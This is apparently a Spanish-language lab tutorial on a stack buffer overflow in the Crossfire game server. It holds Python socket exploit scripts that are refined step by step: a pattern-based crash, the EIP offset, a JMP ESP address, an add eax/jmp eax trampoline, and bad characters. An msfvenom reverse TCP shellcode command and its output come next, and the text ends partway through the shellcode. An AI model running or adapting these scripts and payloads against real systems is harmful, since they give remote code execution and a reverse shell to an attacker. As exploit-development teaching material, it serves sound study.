f2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp
```

Tomamos el resultado y lo aÃ±adimos en nuestro script:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em6Em7Em8Em9En0En1En2En3En4En5En6En7En8En9Eo0Eo1Eo2Eo3Eo4Eo5Eo6Eo7Eo8Eo9Ep0Ep1Ep2Ep3Ep4Ep5Ep6Ep7Ep8Ep9Eq0Eq1Eq2Eq3Eq4Eq5Eq6Eq7Eq8Eq9Er0Er1Er2Er3Er4Er5Er6Er7Er8Er9Es0Es1Es2Es3Es4Es5Es6Es7Es8Es9Et0Et1Et2Et3Et4Et5Et6Et7Et8Et9Eu0Eu1Eu2Eu3Eu4Eu5Eu6Eu7Eu8Eu9Ev0Ev1Ev2Ev3Ev4Ev5Ev6Ev7Ev8Ev9Ew0Ew1Ew2Ew3Ew4Ew5Ew6Ew7Ew8Ew9Ex0Ex1Ex2Ex3Ex4Ex5Ex6Ex7Ex8Ex9Ey0Ey1Ey2Ey3Ey4Ey5Ey6Ey7Ey8Ey9Ez0Ez1Ez2Ez3Ez4Ez5Ez6Ez7Ez8Ez9Fa0Fa1Fa2Fa3Fa4Fa5Fa6Fa7Fa8Fa9Fb0Fb1Fb2Fb3Fb4Fb5Fb6Fb7Fb8Fb9Fc0Fc1Fc2Fc3Fc4Fc5Fc6Fc7Fc8Fc9Fd0Fd1Fd2Fd3Fd4Fd5Fd6Fd7Fd8Fd9Fe0Fe1Fe2Fe3Fe4Fe5Fe6Fe7Fe8Fe9Ff0Ff1Ff2Ff3Ff4Ff5Ff6Ff7Ff8Ff9Fg0Fg1Fg2Fg3Fg4Fg5Fg6Fg7Fg8Fg9Fh0Fh1Fh2Fh3Fh4Fh5Fh6Fh7Fh8Fh9Fi0Fi1Fi2Fi3Fi4Fi5Fi6Fi7Fi8Fi9Fj0Fj1Fj2Fj3Fj4Fj5Fj6Fj7Fj8Fj9Fk0Fk1Fk2Fk3Fk4Fk5Fk6Fk7Fk8Fk9Fl0Fl1Fl2Fl3Fl4Fl5Fl6Fl7Fl8Fl9Fm0Fm1Fm2Fm3Fm4Fm5Fm6Fm7Fm8Fm9Fn0Fn1Fn2Fn3Fn4Fn5Fn6Fn7Fn8Fn9Fo0Fo1Fo2Fo3Fo4Fo5Fo6Fo7Fo8Fo9Fp0Fp1Fp2Fp3Fp4Fp5Fp6Fp7Fp8Fp"

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print "[*] Enviando buffer..." 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print "[*] Payload Enviado!" 
except:
	print "\nError conectando con el servicio...\n"
	sys.exit(0)
```

En el resultado desde **edb**, observamos la siguiente respuesta:

```bash
The debugged application encountered a segmentation fault.
The address 0x46367046 does not appear to be mapped.

If you would like to pass this exception to the application press Shift+[F7/F8/F9]
```

Teniendo estos valores que han sobreescrito el **EIP**, calculamos el Offset:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 46367046
[*] Exact match at offset 4368
```

Sabiendo ya que su valor es 4368, montamos el siguiente PoC para corroborar que tomamos el control del **EIP**:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = "A"*4368 + "B"*4 + "C"*(4379-4368-4)

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print "[*] Enviando buffer..." 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print "[*] Payload Enviado!" 
except:
	print "\nError conectando con el servicio...\n"
	sys.exit(0)
```

Obviamente, hacemos relleno con el caracter _C_ a fin de alcanzar los 4379 bytes. Obtenemos la siguiente respuesta desde **edb** tras enviar nuestro Buffer:

```bash
The debugged application encountered a segmentation fault.
The address 0x42424242 does not appear to be mapped.

If you would like to pass this exception to the application press Shift+[F7/F8/F9]
```

Dado que vemos que estamos tomando el control del EIP, la idea en este caso es analizar los registros con el objetivo de saber dÃ³nde situar nuestro Shellcode.

#### Register Enumeration

En este punto, dado que sabemos que el tamaÃ±o total aceptado antes de que el programa crashee de otra forma es **4379**, tenemos en consideraciÃ³n que de buffer mandamos **4368** y tras sobreescribir el **EIP** aÃ±adimos **4** bytes, dejando un total de **7 bytes** para generar nuestras instrucciones.

Este margen de 7 bytes como podremos intuir dispone de un espacio muy pequeÃ±o para fijar nuestro Shellcode, lo que hace que tengamos que saltar a otro registro donde podamos situar nuestro Payload sin inconveniente (es una tÃ©cnica). Si atendemos al registro **EAX**, una vez se produce el desbordamiento de buffer, vemos que apunta justo al principio de nuestro Buffer:

`EAX: setup sound AAAAAAAAAAAAAAAA...`

Si hacemos memoria, podemos recordar que el buffer que enviamos posee un tamaÃ±o aceptable de 4368 bytes, lo que hace que tengamos espacio de sobra para situar nuestro Shellcode. No supondrÃ­a ningÃºn problema el saltar al registro **EAX**, pero para ello debemos tener en cuenta que tras producirse el desbordamiento, nuestros caracteres que serÃ¡n convertidos a Opcodes comenzarÃ¡n a situarse en el registro **ESP**, lo que hace que primero debamos buscar una direcciÃ³n en la memoria con permisos de ejecuciÃ³n para que desde el **EIP** se aplique un salto al registro **ESP** y posteriormente de aquÃ­ saltar al registro **EAX**.

Nos encontraremos con un problema tras saltar al registro **EAX**, pero lo abordaremos mÃ¡s adelante.

#### JMP ESP Opcode

Recodemos que contamos con un margen de 7 bytes para definir nuestras instrucciones, donde una de ellas es el salto al registro **EAX** que pretendemos hacer para posteriormente situar nuestro Shellcode.

Lo primero serÃ¡ hacer que el registro **EIP** apunte al **ESP**, donde posteriormente insertaremos nuestros Opcodes. Para ello, desde **edb**, podemos tras producirse el desbordamiento presionar la tecla **Ctrl+O** para el _Opcode Searcher_. 

Una vez abierto, seleccionamos la direcciÃ³n del binario **crossfire** que cuenta con permisos de ejecuciÃ³n, seleccionando de la lista desplegable el salto **ESP -> EIP**. Pinchamos en **Find** y esperamos a que el programa encuentre las direcciones donde se realizan el salto al registro **ESP**.

Encontramos la siguiente:

`0x08134596: jmp esp`

Como es de esperar, nuestro registro **EIP** tomarÃ¡ dicho valor en formato _Little Endian_:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = "A"*4368 + pack('<L', 0x08134596) + "C"*(4379-4368-4)

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print "[*] Enviando buffer..." 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print "[*] Payload Enviado!" 
except:
	print "\nError conectando con el servicio...\n"
	sys.exit(0)
```

Tras enviar el buffer, si establecemos previamente con la tecla **F2** un _breakpoint_ en el registro **0x08134596**, podremos ver como el aplicativo muestra que el registro **EIP** apunta a la direcciÃ³n **0x08134596**, correspondiente al **ESP**. Pulsando la tecla **F8**, avanzaremos una instrucciÃ³n por pulsaciÃ³n, donde se puede ver como las siguientes instrucciones son:

```bash
bffa:4de0 43           inc ebx
bffa:4de1 43           inc ebx
bffa:4de2 43           inc ebx
bffa:4de3 43           inc ebx
bffa:4de4 43           inc ebx
bffa:4de5 43           inc ebx
bffa:4de6 43           inc ebx
```

Correspondiente a los 7 bytes finales de margen que tenemos donde por el momento se encuentran situados nuestro caracter _C_.

#### JMP EAX From ESP

Ahora que controlamos el flujo del programa y estamos en el registro **ESP**, como este sÃ³lo cuenta con 7 bytes de margen, saltaremos al registro **EAX** con el objetivo de depositar posteriormente nuestro Shellcode.

Surge un problema a la hora de saltar al registro **EAX**, y es que la cadena '_setup sound_' es interpretada como **Opcode**:

```bash
73 65	jae 0xb7487a75
74 75	je 0xb7487a87
70 20	jo 0xb7487a34
73 6f	jae 0xb7487a85
75 6e	jne 0xb7487a86
```

Esto puede causar inconvenientes, pues el flujo del programa como vemos puede tomar saltos a otras direcciones no deseadas haciendo que posteriormente nuestro Shellcode no sea interpretado.

La cadena '_setup sound_' ocupa 12 bytes (con espacios incluidos), por lo que algo inteligente a hacer desde **nasm_shell.rb** es aplicar los siguientes Opcodes:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
â””â”€â”€â•¼ #/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb 
nasm > add eax,12
00000000  83C00C            add eax,byte +0xc
nasm > jmp eax
00000000  FFE0              jmp eax
```

Desplazamos en un margen de 12 bytes el contenido de **EAX**, de forma que en estos 3 bytes de instrucciÃ³n el registro se nos quedarÃ­a apuntando justo al comienzo de nuestro bÃºffer (AAAAAAAA...), posteriormente en otros 2 bytes aplicamos un salto a dicho registro.

Â¿Lo bueno de todo esto?, que en total son 5 bytes de instrucciÃ³n, y si recordamos contÃ¡bamos con un margen de 7 bytes para realizar nuestras instrucciones... por lo tanto, de maravilla.

Estos Opcodes al fin y al cabo se traducen en "**\x83\xC0\x0C\xFF\xE0**", de forma que nuestro script quedarÃ­a tal y como se representa a continuaciÃ³n:

```python
#!/usr/bin/python 

import socket, sys

from struct import pack
from time import sleep

if len(sys.argv) != 2:
	print "\nUso: python" + sys.argv[0] + " <direccionIP>\n"
	sys.exit(0)

host = sys.argv[1]
port = 13327

# Total bytes: 4379
crash = "A"*4368 + pack('<L', 0x08134596) + "\x83\xC0\x0C\xFF\xE0" + "\x90\x90"

buffer = "\x11(setup sound " + crash + "\x90\x00#" 

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

	print "[*] Enviando buffer..." 
	s.connect((host,port))
	s.send(buffer)
	data=s.recv(1024)
	print data 
	s.close()
	print "[*] Payload Enviado!" 
except:
	print "\nError conectando con el servicio...\n"
	sys.exit(0)
```

Obviamente, aÃ±adimos 2 bytes de **NOPs** para completar el tamaÃ±o de 4379 bytes. Ahora que el flujo del programa se encamina por donde queremos, la idea es sustituir nuestras _Aes_ por nuestro Shellcode, teniendo en consideraciÃ³n que tras estar codificado por _shikata_, habrÃ¡ que aÃ±adir unos 16 bytes de margen al principio del registro para que nuestro Shellcode se pueda decoficar.

Â¡Que no se nos olvide comprobar los Badchars!, que para este caso son "**\x00\x0a\x0d\x20**". Este paso no hace falta detallarlo, pues no es el mÃ¡s complejo que digamos y ya lo hemos visto en Windows. Simplemente tener en cuenta que con el espacio que contamos en el registro **EAX** podemos ir mandando los caracteres a fin de analizar cuÃ¡les de ellos dan problema.

#### Msfvenom Linux Payload

Para generar nuestro Shellcode, aplicamos el siguiente comando:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/BoF]
â””â”€â”€â•¼ #msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.51 LPORT=443 -a x86 --platform linux -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x20"
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
"\xbd\x85\xd3\x0b\xb7\xdd\xc5\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x12\x31\x6e\x12\x03\x6e\x12\x83\x6b\x2f\xe9\x42\x42\x0b\x19"
"\x4f\xf7\xe8\xb5\xfa\xf5\x67\xd8\x4b\x9f\xba\x9b\x3f\x06\xf5"
"\xa3\xf2\x38\xbc\xa2\xf5\x50\xff\xfd\x07\x93\x97\xff\x07\xd2"
"\xdc\x89\xe9\x64\x44\xda\xb8\xd7\x3a\xd9\xb3\x36\xf1\x5e\x91"
"\xd0\x64\x70\x65\x48\x11\xa1\xa6\xea\x88\x34\x5b\xb8\x19\xce"
